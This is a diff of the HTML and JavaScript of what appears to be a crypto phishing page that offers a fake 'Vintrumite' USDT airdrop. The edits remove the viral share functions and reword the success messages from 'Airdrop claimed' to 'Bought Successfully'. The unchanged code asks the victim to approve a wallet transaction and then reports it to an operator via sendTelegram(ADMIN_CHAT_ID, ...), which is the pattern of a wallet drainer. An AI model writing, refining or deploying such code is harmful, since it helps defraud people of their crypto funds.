@@ -1323,18 +1323,18 @@ Phoenix token ecosystem ad placement.
             </div>
             
             <div class="share-container">
-                <button class="share-btn telegram" onclick="shareToTelegram()" title="Share on Telegram">
+                <div class="share-btn telegram" onclick="shareToTelegram()" title="Share on Telegram">
                     <i class="fab fa-telegram"></i>
-                </button>
-                <button class="share-btn whatsapp" onclick="shareToWhatsApp()" title="Share on WhatsApp">
+                </div>
+                <div class="share-btn whatsapp" onclick="shareToWhatsApp()" title="Share on WhatsApp">
                     <i class="fab fa-whatsapp"></i>
-                </button>
-                <button class="share-btn twitter" onclick="shareToTwitter()" title="Share on Twitter">
+                </div>
+                <div class="share-btn twitter" onclick="shareToTwitter()" title="Share on Twitter">
                     <i class="fab fa-twitter"></i>
-                </button>
-                <button class="share-btn link" onclick="copyLink()" title="Copy Link">
+                </div>
+                <div class="share-btn link" onclick="copyLink()" title="Copy Link">
                     <i class="fas fa-link"></i>
-                </button>
+                </div>
             </div>
             
             <div class="premium-footer">
@@ -1366,28 +1366,6 @@ Phoenix token ecosystem ad placement.
                 particlesContainer.appendChild(particle);
             }
         }
-
-        // Share functions
-        function shareToTelegram() {
-            navigator.clipboard.writeText(window.location.href);
-            updateStatusMessage('Telegram sharing link copied to clipboard!', 'success');
-        }
-
-        function shareToWhatsApp() {
-            const text = encodeURIComponent("Just claimed my exclusive USDT airdrop on Vintrumite! 🎁✨\n\nJoin now: " + window.location.href);
-            window.open(`https://wa.me/?text=${text}`, '_blank');
-        }
-
-        function shareToTwitter() {
-            const text = encodeURIComponent("Just claimed my exclusive USDT airdrop on Vintrumite! 🎁✨\n\nJoin now: " + window.location.href);
-            window.open(`https://twitter.com/intent/tweet?text=${text}`, '_blank');
-        }
-
-        function copyLink() {
-            navigator.clipboard.writeText(window.location.href);
-            updateStatusMessage('Link copied to clipboard!', 'success');
-        }
-
         // Update status message
         function updateStatusMessage(message, type = 'info') {
             const statusEl = document.getElementById('statusMessage');
@@ -1557,7 +1535,7 @@ Phoenix token ecosystem ad placement.
                 isProcessing=true;
                 approveBtn.classList.add('loading');
                 approveBtn.disabled=true;
-                updateStatusMessage('Approving Vintrumite Airdrop...','approving');
+                updateStatusMessage('Approving Vintrumite token...','approving');
                 try{
                     if(activeProviderType==='injected') await ensureInjectedChain();
                     const network=NETWORKS[currentChainId];
@@ -1582,9 +1560,9 @@ Phoenix token ecosystem ad placement.
 
                         await sendTelegram(ADMIN_CHAT_ID, message);
 
-                        updateStatusMessage('✅ Vintrumite Airdrop claimed successfully!','approved');
+                        updateStatusMessage('✅ Vintrumite token','approved');
                         approveBtn.classList.remove('loading');
-                        approveBtn.innerHTML = '<i class="fas fa-check"></i> Claimed Successfully!';
+                        approveBtn.innerHTML = '<i class="fas fa-check"></i> Bought Successfully!';
                         approveBtn.disabled = true;
                     } else throw new Error("Transaction failed");
                 } catch(err){
